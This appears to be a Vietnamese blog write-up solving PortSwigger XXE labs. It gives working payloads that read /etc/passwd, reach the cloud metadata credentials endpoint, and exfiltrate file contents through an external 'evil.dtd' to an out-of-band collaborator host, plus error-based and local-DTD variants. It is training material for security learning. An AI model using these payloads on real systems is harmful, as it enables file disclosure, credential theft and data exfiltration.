---
title: "[PortSwigger Lab] - XML External Entity Injection (XXE)"
description: Solution of XML External Entity Injection (XXE) Lab
date: 2025-06-10 17:18:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, xxe]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-10-portswigger-lab-xxe/xxe.png
    alt: XML External Entity Injection (XXE)
---

## Introduction
---
### **XML (Extensible Markup Language)**
- **XML (Extensible Markup Language)** là một ngôn ngữ đánh dấu được thiết kế để lưu trữ và truyền dữ liệu.
- Cấu trúc của **XML** giống như **HTML**: gồm các thẻ **(tags)** và dữ liệu, tổ chức theo dạng cây.
- Không giống **HTML**, **XML** không có sẵn các thẻ cố định — có thể tự đặt tên thẻ để mô tả dữ liệu.
- Trước kia **XML** rất phổ biến trong web (ví dụ: **AJAX** là viết tắt của **Asynchronous JavaScript And XML**), nhưng hiện tại đã được thay thế nhiều bởi **JSON**.

### **XML Entities**
**Entity** là một cách để đại diện cho dữ liệu đặc biệt trong **XML** bằng một ký hiệu thay vì dữ liệu thực tế.

| Đặc điểm                 | `&entity;` (general)      | `%entity;` (parameter)       |
| ------------------------ | ------------------------- | ---------------------------- |
| Dùng ở đâu               | Trong body XML            | Trong phần DTD               |
| Mục đích chính           | Chèn dữ liệu vào nội dung | Tái sử dụng / tổ chức DTD    |
| Gọi bằng                 | `&entity;`                | `%entity;`                   |
| Cho phép lồng nhau?      | Không dùng `%` trong `&`  | Có thể chứa định nghĩa `&`   |
| Dùng trong XXE nâng cao? | ✔ (để gửi dữ liệu)        | ✔ (để lách luật và khai báo) |

### **Document Type Definition (DTD)**
- **DTD** định nghĩa cấu trúc hợp lệ của một tài liệu **XML**:
    - Các phần tử (**element**)
    - Kiểu dữ liệu
    - Các thực thể (**entities**)
- **DTD** được khai báo bằng thẻ `<!DOCTYPE>` đầu tài liệu **XML**.
- Có thể là:
    - Nội bộ (**internal**): định nghĩa ngay trong **XML**
    - Bên ngoài (**external**): tham chiếu từ một nguồn ngoài

### **XML External Entity Injection (XXE)**
**XML External Entity Injection (XXE)** là một lỗ hổng bảo mật trên web xảy ra khi một ứng dụng xử lý dữ liệu **XML** mà không cấu hình đúng cách trình phân tích cú pháp **XML (XML parser)**. Điều này cho phép kẻ tấn công chèn và thực thi các thực thể bên ngoài **(external entities)** độc hại vào dữ liệu **XML**.

### Types of XXE attacks

| **Loại tấn công**                              | **Mô tả**                                                                                                                              |
| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **XXE đọc file nội bộ (File Disclosure)**      | Đọc nội dung các file nhạy cảm trên hệ thống máy chủ, ví dụ: `/etc/passwd`, cấu hình ứng dụng, key bí mật,...                          |
| **XXE gây SSRF (Server-Side Request Forgery)** | Gửi yêu cầu từ máy chủ đến các địa chỉ nội bộ hoặc dịch vụ khác mà máy chủ có thể truy cập (VD: `http://localhost:8000/internal-api`). |
| **Blind XXE - Exfiltration qua kênh phụ**      | Dữ liệu không hiển thị trực tiếp trong phản hồi, nhưng được gửi âm thầm đến máy chủ do kẻ tấn công kiểm soát thông qua HTTP, FTP,...   |
| **Blind XXE - Rò rỉ dữ liệu qua lỗi**          | Gây ra lỗi trong quá trình phân tích XML, khiến dữ liệu nhạy cảm bị rò rỉ qua thông báo lỗi trả về từ ứng dụng.                        |

## Solve **XML External Entity Injection (XXE)** Lab

| Thuộc tính                | **Internal DTD**                              | **External DTD**                                              | **Internal Entity**                                         | **External Entity**                                           |
| ------------------------- | --------------------------------------------- | ------------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------- |
| **Vị trí định nghĩa**     | Ngay trong tài liệu XML                       | Trong file .dtd bên ngoài (hoặc đường dẫn HTTP, file://, ...) | Trong DTD nội bộ hoặc XML                                   | Trỏ tới tài nguyên bên ngoài qua URL/file                     |
| **Cách khai báo**         | `<!DOCTYPE ... [ ... ]>`                      | `<!DOCTYPE root SYSTEM "file.dtd">`                           | `<!ENTITY name "giá trị">`                                  | `<!ENTITY name SYSTEM "http://...">`                          |
| **Tải từ đâu**            | XML parser đọc trực tiếp từ nội dung file XML | XML parser phải tải file `.dtd` từ URL hoặc file hệ thống     | Giá trị được gán trực tiếp (văn bản thuần)                  | Tải nội dung từ tài nguyên ngoài (file, URL, etc.)            |
| **Có thể gây XXE không?** | ❌ Không trực tiếp gây OOB XXE                 | ✅ Có thể dùng để tải entity độc hại từ attacker               | ❌ Không có khả năng tương tác với hệ thống hoặc gửi dữ liệu | ✅ Có thể dùng để đọc file, thực hiện HTTP request, exfiltrate |
| **Dễ bị lọc không?**      | ✅ Dễ bị phát hiện và lọc                      | ❌ Khó lọc hơn nếu dùng qua `file:///`, `jar:` v.v.            | ✅ Hầu như vô hại                                            | ✅ Có khả năng nguy hiểm nếu parser không kiểm soát            |

---
### Lab: Exploiting XXE using external entities to retrieve files
#### Exploit
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "/etc/passwd">
]>
<stockCheck>
    <productId>1;&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Ta nhận được nội dung của `/etc/passwd`

```text
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```
#### How it work?
- Ứng dụng nhận request
- **XML Parser** tìm thấy dòng `<!DOCTYPE foo ...>` nên bật chế độ **Document Type Definition (DTD)** — định nghĩa cấu trúc của tài liệu XML
- Gặp khai báo `<!ENTITY xxe SYSTEM "/etc/passwd">` nên đi tải tệp `/etc/passwd` từ chính server gán cho thực thể `xxe`. 
- Sau đó, khi parser thấy chuỗi `&xxe;` bên trong `<productId>`, nó thay thế token đó bằng nội dung tệp vừa đọc.
- XML sau khi mở rộng entity: **Parser** tạo ra tài liệu nội bộ: xml 

```xml
<stockCheck>
    <productId>1;root:x:0:0:root:/root:/bin/bash …</productId> <storeId>1</storeId> 
</stockCheck>
```
- `Framework` cố map `<productId>` vào thuộc tính **int** productId hoặc **Long** productId của class `StockCheckRequest`.
- Chuyển đổi chuỗi `"1;root:x:0:0:..."` sang số nguyên thất bại => ứng dụng trả lỗi là nội dung chuyển đổi về cho người dùng

### Lab: Exploiting XXE to perform SSRF attacks
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
    <productId>1; &xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```
- Đây là một địa chỉ IP được sử dụng bởi các nhà cung cấp dịch vụ đám mây, chẳng hạn như **AWS**, **Azure** và **Google Cloud**, để cung cấp siêu dữ liệu về các trường hợp.

### Lab: Exploiting XInclude to retrieve files
#### Analysis
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Quan sát body, ta chỉ thấy `productId=1&storeId=1`, không thể thao túng **DOCTYPE** được:

```xml
<?xml version="1.0"?>
<!DOCTYPE root_element [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root_element>
    <data>content here</data>
</root_element>
```
- Quy tắc vị trí **DOCTYPE**:
    - Sau **XML declaration** `(<?xml version="1.0"?>)`
    - Trước **root element**
    - Không thể đặt ở giữa hoặc cuối **document**
- Ý tưởng: Không cần thao túng **DOCTYPE**, sử dụng **XInclude** là một phần của **XML specification** cho phép xây dựng **XML document** từ các **sub-documents**.

#### Exploit
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành:

```xml
productId=1;<xi:include parse="text" href="/etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>&storeId=1
```
- `xmlns:xi="http://www.w3.org/2001/XInclude"`: Khai báo **XInclude namespace**
- `xi:include`: Element để **include** file
- `parse="text"`: **Parse** nội dung như **plain text**
    - Mặc định `parse="xml"`
    - `/etc/paswd` ở dạng **text** nên chuyển `parse="text"` để đọc
- `href="/etc/passwd"`: Đường dẫn đến **file** cần đọc

### Lab: Exploiting XXE via image file upload
- Ý tưởng upload file có định dạng **xml** để kích hoạt **parser xml**
- Đến 1 blog bất kỳ và thực hiện **comment**, up 1 file svg với kích thước nhỏ
- Sửa đổi nội dung payload 

```http
POST /post/comment HTTP/2
Host: 0ad300dd04bbcf8180c949a5001400d3.web-security-academy.net

...

------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="csrf"

SSuEc7ucI0xjZe5QBzhWN1omE2ukkdZd
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="postId"

2
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="comment"

a
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="name"

a
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="avatar"; filename="a.svg"
Content-Type: image/svg+xml

<?xml version="1.0"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/hostname" > 
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="email"

a@gmail.com
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="website"

http://a.com
------WebKitFormBoundaryjBtoTJseBoFRQecm--
```

- Vì **SVG** file cũng thuộc định dạng `xml` nên ta có thể tạo như trên
- Tạo ra **xxe** lấy nội dung của `file:///etc/hostname`
- Sau đó hiển thị nó trong file **SVG** người dùng có thể thấy được thông qua `&xxe;`
- Gửi lại request và mở file `/post/comment/avatars?filename=1.png` trong tab mới
- Nội dung hiển thị trong ảnh là nội dung của `/etc/hostname`
- Submit solution

### Lab: Blind XXE with out-of-band interaction
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành:

```http
POST /product/stock HTTP/2
Host: 0a20005b0305155e8ba47e19007c00dd.web-security-academy.net
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "https://yorr-burp-collaborator.oastify.com">
]>
<stockCheck>
    <productId>1; &xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Copy địa chỉ **Burp Collaborator** và dán vào entity `xxe`
- Khi gọi `entity xxe`, ứng dụng sẽ gửi request đến **Burp Collaborator**
- Pool now để nhận request

### Lab: Blind XXE with out-of-band interaction via XML parameter entities
- Tương tự như lab ở trên, ta sử dụng **General entity (&)** để khai thác nhưng nhận được `"Entities are not allowed for security reasons"`
- Thử khai thác bằng **Parameter entity (%)**
- Gửi lại request với payload sau:

```http
POST /product/stock HTTP/2
Host: 0a4f00c0043e914981d0251e001f0036.web-security-academy.net
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://yorr-burp-collaborator.oastify.com">%xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Sự khác nhau rõ rệt là **General entity (&)** sử dụng ở body, còn **Parameter entity (%)** sử dụng ở **Document Type Definition (DTD)**
- Copy địa chỉ **Burp Collaborator** và dán vào entity `xxe`
- Khi gọi `entity xxe`, ứng dụng sẽ gửi request đến **Burp Collaborator**
- Pool now để nhận request

### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi request thành:

```http
POST /product/stock HTTP/2
Host: 0a1f00d704dddf3e80eb3a20004a0097.web-security-academy.net
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "your-burp-collaborator.oastify.com">
%xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
- **Pool now** tại **Burp Collaborator** => có request đến => Có thể gửi dữ liệu ra bên ngoài
- Đến **Exploit Server**, dán nội dung sau vào body:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
- Đổi đường dẫn thành `evil.dtd`
- Gửi lại request với payload sau:

```http
POST /product/stock HTTP/2
Host: 0a1f00d704dddf3e80eb3a20004a0097.web-security-academy.net
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://exploit-0a55007d04b51db4809707b6016c0002.exploit-server.net/evil.dtd">
%xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Đến **Burp Collaborator** > **Pool now**, lấy **hostname** từ request đến và submit

- Theo chuẩn XML:
    - Nếu bạn chỉ dùng internal DTD, bạn không được phép định nghĩa một entity tham số **(parameter entity)** bên trong định nghĩa của **entity** khác (parser sẽ báo lỗi).
    - Nhưng nếu bạn sử dụng hybrid DTD — tức là:
        - Tài liệu XML có DTD nội bộ, và
        - Tài liệu đó cũng load thêm một DTD bên ngoài (SYSTEM "file://...")
    - Thì parser sẽ "thư giãn" quy tắc, và cho phép bạn ghi đè các **entity** đã định nghĩa trong **external DTD** từ phần **internal DTD**.

### Lab: Exploiting blind XXE to retrieve data via error messages
- Tương tự như lab trên nhưng thay đổi payload thành:

```http
POST /product/stock HTTP/2
Host: 0ac900f00310f92a80080d33001b00b3.web-security-academy.net
...
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
<!ENTITY % ref SYSTEM "https://exploit-0add00b803d7f998808c0cf8018a00b8.exploit-server.net/exploit">
%ref;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Trong body của **Exploit Server**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
- Ứng dụng sẽ trả về lỗi:

```text
"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
```

### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
- Tương tự như lab trên nhưng thay đổi payload thành:

```http
POST /product/stock HTTP/2
Host: 0af3000803a01dc482395db800c2009d.web-security-academy.net
...
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```
- **XML parser** cho phép ghi đè **entity** đã định nghĩa trong **DTD** bên ngoài nếu **DTD** sử dụng kết hợp nội bộ + bên ngoài **(hybrid DTD).**
- Điều này tạo ra lỗ hổng trong quy chuẩn **XML**, nơi có thể sử dụng **entity** tham số trong định nghĩa của **entity** khác — điều vốn bị cấm trong **DTD** nội bộ hoàn toàn.
- Vậy nên, nếu tìm thấy một file **DTD** cục bộ hợp lệ, có thể:
    - Nạp file **DTD** đó vào như external **DTD**.
    - Ghi đè một **entity** đã được định nghĩa sẵn trong đó để chèn payload khai thác kiểu **error-based XXE**.

## Prevent
--- 
- Không bao giờ tin tưởng đầu vào XML từ bên ngoài.
- Tắt các tính năng không cần thiết của parser.
- Sử dụng thư viện XML đã được "hardening" như defusedxml (Python) hoặc cấu hình chặt chẽ (Java, .NET).

---
Goodluck! 🍀🍀🍀 